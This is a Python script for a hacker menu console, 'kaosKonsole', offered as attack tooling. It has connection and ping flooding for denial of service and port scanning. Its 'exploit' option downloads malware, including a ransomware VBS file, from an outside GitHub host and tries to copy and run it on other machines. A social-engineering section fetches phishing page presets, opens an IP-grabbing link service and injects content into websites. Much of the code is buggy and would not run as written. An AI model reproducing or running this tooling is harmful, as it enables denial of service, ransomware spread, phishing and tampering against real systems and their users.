import os
import socket
import requests
from bs4 import BeautifulSoup
import shutil
import subprocess
import urllib.request
import time

defaultpath = os.path.abspath(__file__)

os.system("title kaosKonsole")
os.system("color 04")
while True:  
    print("___________________________________________________________________")
    print("                            _    _                                 ")
    print("    /                       /  ,'                           /      ")
    print("---/-__----__----__---__---/_.'------__----__---__----__---/----__-")
    print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
    print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")

    print(time.localtime)
    print(time.ctime)
    print(time.mktime)
    print(time.daylight)
    print("universal: " + time.gmtime)
    print("perf: " + time.perf_counter)

    print("Connect to IP + Port: c")
    print("Sniff connections within a range: sniff")
    print("Sniff IP + Port status: pingsniff")
    print("Flood IP + Port with connections: flood")
    print("Flood IP + Port with pings: pingflood")
    print("Use pingo: pingo")
    print("Social engineering: soc")
                                                                   
    x1 = input("Choose command: ")
    if x1 == "c":
        print("wowza")
        p65 = input("Select an IP: ")
        f34 = int(input("Select da port: "))

        try:
            socket.create_connection((p65, f34))
            print(str(p65) + ":" + str(f34) + " :3")
            print("exploit")
            print("getmeout")
            r43 = input("What now: ")
            if r43 == "exploit":
                print("how to exploit??")
                print("warning this will download some malwares if ur a fucking scrub maybe its not too safe to utilize some of these")
                xb = input("exploit: ")
                if xb == "infarox27":

                    print("based")
                    print("downloading infarox..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27/infarox27.EXE"
                    filename = defaultpath + "\\" + "infarox27.EXE"
                    urllib.request.urlretrieve(url, filename)

                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
                    continue
                elif xb == "MSS":
                    
                    print("$$$$")
                    print("downloading MSS..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
                    filename = defaultpath + "\\" + "MSS.py"
                    urllib.request.urlretrieve(url, filename)

                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
                    continue
                elif xb == "PlorgBetterRansom":

                    print("thats rude")
                    print("downloading PlorgBetterRansom..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
                    filename = defaultpath + "\\" + "Plorg.vbs"
                    urllib.request.urlretrieve(url, filename)

                    copied_fule_path = os.path.join(defaultpath + "\\" + filename)
                    continue

                # pwn nubz
                for i in range(1, 256):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(p65 + str(i))
                        shutil.copy2(filename, p65)
                        subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
                        
                    except:
                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
                        pass
                
            elif r43 == "getmeout":
                exit
            else:
                print("what")
                exit
        except:
            print(str(p65) + " :/")

    elif x1 == "flood":
        stop = False
        while not stop:
            print("OWO")
            l34 = input("Select an IP: ")
            m21 = int(input("Select da port: "))
            if l34 == "99":
                stop = True
                break

            while True:
                try:
                    socket.create_connection(l34, m21)
                    print(str(l34) + str(m21) + " +1")
                except:
                    print(str(l34) + str(m21) + " +0")
                    break

    elif x1 == "pingflood":
        ports = []
        stop = False
        while not stop:
            print("X3")
            print("Options:")
            print("-r to specify range")
            j44 = input("Select an IP: ")
            if "-r" in j44:
                m77 = int(input("Select da port range: "))
                julie26 = list(map(int, m77.split()))
                ports.extend(julie26)
                if j44 == "99":
                    stop = True
                    break
                for port in ports:
                    print(port )
                    while True:
                        try:
                            os.system("ping " + j44 + " " + str(port))
                            print(str(j44) + str(port) + " +1")
                        except:
                            print(str(j44) + str(port) + " +0")
            else:
                p34 = int(input("Select da port: "))
                if j44 == "99":
                    stop = True
                    break

                while True:
                    try:
                        os.system("ping " + j44 + " " + str(p34))
                        print(str(j44) + str(p34) + " +1")
                    except:
                        print(str(j44) + str(p34) + " +0")
                        continue

    elif x1 == "sniff":
        print("yowza")
        ports = []
        stop = False
        while not stop:
            print("sniff....sniffsniff........")
            roko99 = input("Select an IP: ")
            pk56 = input("Select da port range: ")
            jodie34 = list(map(int, pk56.split()))
            ports.extend(jodie34)
            if roko99 == "99":
                stop = True
                break

            for port in ports:
                try:
                    socket.create_connection((roko99, port))
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

    elif x1 == "pingsniff":
        print("hehehe")
        print("sniff...snifssnsifffff.......")
        ports = []
        stop = False
        while not stop:
            jorn79 = input("Select an IP: ")
            jm23 = input("Select da port range: ")
            joyce80 = list(map(int, jm23.split()))
            ports.extend(joyce80)
            if jorn79 == "99":
                stop = True
                break

            for port in ports:
                try:
                    os.system("ping " + jorn79 + port)
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

    elif x1 == "pingo":
        print("boing")
        m13 = input("REQUESTS: ")
        l56 = input("CONNECTIONS: ")
        j342 = input("HOSTNAME: ")
        m32 = input("HOSPORT: ")
        try:
            output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)
            p = subprocess.Popen(['ruby', 'pingo.rb', '-n' , m13, '-c', l56, '-h', j342, '-p', m32], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            o4 = p.stdout.read()
            print(o4)
            v3 = p.stderr.read()
            print(v3)
        except subprocess.CalledProcessError:
            print("u dont got that")
            break
        except FileNotFoundError:
            print("u dont got that")
            break

    elif x1 == "soc":
        os.system("cls")
        os.system("color 03")
        os.system("title evileye")
        print("                             ▒▒▒▒▓▓▒▒▒▒▓▓▒▒░░                         ")
        print("                      ▓▓▒▒▒▒▒▒░░▓▓░░▒▒▒▒░░▓▓▓▓▒▒▓▓                    ")
        print("                  ░░░░░░░░▒▒    ▒▒  ░░    ░░▒▒▒▒▒▒▓▓▒▒░░              ")
        print("              ░░░░░░                    ░░▒▒░░░░░░░░▒▒▓▓▒▒░░          ")
        print("            ░░░░░░                          ░░    ░░░░▒▒░░▓▓          ")
        print("          ░░░░░░                  ░░▒▒░░            ░░▒▒▒▒▒▒▓▓        ")
        print("        ░░░░░░░░                    ░░                ░░▒▒░░▒▒▒▒      ")
        print("        ░░░░                                      ▒▒    ▒▒░░░░░░      ")
        print("      ░░░░░░    ░░                                        ▒▒▒▒░░      ")
        print("    ░░░░░░░░        ░░                                      ▒▒░░░░    ")
        print("    ░░░░░░░░    ▒▒  ▒▒      ░░▒▒▓▓▓▓▓▓▒▒▒▒░░        ▒▒  ▒▒░░░░▓▓░░░░  ")
        print("  ░░░░░░  ░░      ▓▓  ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░  ░░░░░░░░░░░░░░░░░░  ")
        print("  ░░░░                ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░░  ▒▒░░        ░░░░░░")
        print("  ░░░░                ▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░  ░░▒▒▒▒  ░░          ▒▒░░░░")
        print("  ░░            ░░  ▒▒▒▒▒▒▒▒░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░            ░░░░░░")
        print("░░▒▒            ░░  ▒▒▒▒▒▒▒▒░░░░████▒▒██▒▒▒▒▒▒▒▒▒▒▒▒              ░░░░")
        print("▒▒                  ▒▒▒▒▒▒▒▒░░▒▒████  ██▓▓▒▒▒▒▒▒▒▒▒▒          ░░  ░░░░")
        print("░░░░        ▒▒      ▒▒░░▒▒▒▒▒▒▓▓██████████▒▒▒▒▒▒▒▒▒▒            ░░░░░░")
        print("░░░░░░      ▒▒  ▒▒  ▒▒░░░░▒▒▒▒▓▓██████████░░▒▒▒▒▒▒▒▒  ░░        ░░▒▒░░")
        print("░░░░            ░░  ▒▒░░░░  ░░▒▒▓▓██████░░░░▒▒▒▒▓▓▒▒  ░░░░        ░░░░")
        print("░░▒▒            ░░  ░░▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░            ░░░░░░")
        print("  ░░░░░░░░            ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒░░          ░░▒▒▒▒░░")
        print("  ▒▒░░░░              ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒          ░░░░░░░░░░")
        print("  ▒▒░░▒▒░░            ▒▒░░▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒            ░░▒▒░░░░  ")
        print("    ░░▒▒▒▒░░░░        ░░    ▒▒▓▓▒▒▒▒▒▒▒▒▒▒░░              ░░  ░░░░░░  ")
        print("    ░░▓▓▒▒▒▒░░          ▒▒                                ░░░░░░░░    ")
        print("      ▒▒▓▓░░░░░░░░░░░░▒▒  ░░░░                            ░░░░░░      ")
        print("        ░░░░░░▒▒▒▒▒▒  ▒▒                                ░░  ░░        ")
        print("          ▒▒▒▒▒▒▒▒░░░░░░                              ▒▒░░░░░░        ")
        print("            ░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒            ░░░░░░    ░░░░░░░░          ")
        print("                ▓▓░░▒▒░░░░░░▒▒░░  ░░  ░░░░░░▒▒░░░░░░░░░░░░            ")
        print("                  ░░▒▒▒▒▒▒░░▓▓▒▒▒▒░░░░▒▒░░░░░░░░░░░░                  ")
        print("                        ▒▒▓▓▓▓▒▒▓▓▒▒░░░░░░░░░░                        ")

        print(" ")
        print(" ")

        print(time.localtime)
        print(time.ctime)
        print(time.mktime)
        print(time.daylight)
        print("universal: " + time.gmtime)
        print("perf: " + time.perf_counter)
        
        print(" ")
        print(" ")
        print("website")
        print("email")
        print(" ")
        print(" ")

        jj34 = input("Select a method for social engineering: ")
        if jj34 == "website":
            print("Which website method?")
            print(" ")
            print("host")
            print("inject")
            jo4 = input(" ")
            if jo4 == "host":
                    print("Would you like to download HTML presets?")
                    jk23 = input("Y/N: ")
                    if jk23 == "Y":
                        print("perf: " + time.perf_counter)
                        print("Downloading HTML presets..")

                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp1.html"
                        filename = defaultpath + "\\" + "htmldp1.html"
                        urllib.request.urlretrieve(url, filename)

                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp2.html"
                        filename = defaultpath + "\\" + "htmldp2.html"
                        urllib.request.urlretrieve(url, filename)
                        continue
                    elif jk23 == "N":
                        continue

                    print("How would you like to host the website?")
                    print("github")
                    mon4 = input(" ")
                    if mon4 == "github":
                        os.sytem("start https://github.com/new")
                        print(time.localtime)
                        print(time.ctime)
                        print(time.mktime)
                        print(time.daylight)
                        print("universal: " + time.gmtime)
                        print("perf: " + time.perf_counter)
                        print(" ")
                        print(" ")
                        print("using github is pretty simple because of https://pages.github.com")
                        print("join https://github.com/kaosSec, create your own organization, or have github pro and you can utilize this method")
                        print(" ")
                        print(" ")
                        print("What link shortener?")
                        print(" ")
                        print("grabify")
                        print("t.ly")
                        print(" ")
                        j61 = input(" ")
                        if j61 == "grabify":
                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")                                                                           
                            os.system("start https://grabify.link")
                            print(time.localtime)
                            print(time.ctime)
                            print(time.mktime)
                            print(time.daylight)
                            print("universal: " + time.gmtime)
                            print("perf: " + time.perf_counter)
                        elif j61 == "t.ly":
                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")      
                            os.system("start https://t.ly/")
                            print(time.localtime)
                            print(time.ctime)
                            print(time.mktime)
                            print(time.daylight)
                            print("universal: " + time.gmtime)
                            print("perf: " + time.perf_counter)
            elif jo4 == "inject":
                print("neat")
                print(" ")
                print(time.localtime)
                print(time.ctime)
                print(time.mktime)
                print(time.daylight)
                print("universal: " + time.gmtime)
                print("perf: " + time.perf_counter)      
                print(" ")
                print(" ")
                print("requests")
                ml23 = input("method: ")
                if ml23 == "requests":
                    rita90 = input("website: ")
                    ron60 = input("element to inject to: ")
                    lenny44 = input("new tag: ")
                    morgi11 = input("content to inject: ")
                    rova = requests.get(rita90)
                    sovi = BeautifulSoup(rova.content, 'html.parser')
                    blik34 = sovi.find(ron60)
                    x23 = sovi.new_tag(lenny44)
                    x23.string = morgi11
                    blik34.append(x23)
                    jonah40 = requests.post(rita90, dta=str(sovi))
                
    elif x1 == "3":
        print("bowza")
    elif x1 == "4":
        print("lowza")
    elif x1 == "99":
        print("bai :3")
        os.system("cls")
        exit()
    else:
        print("??")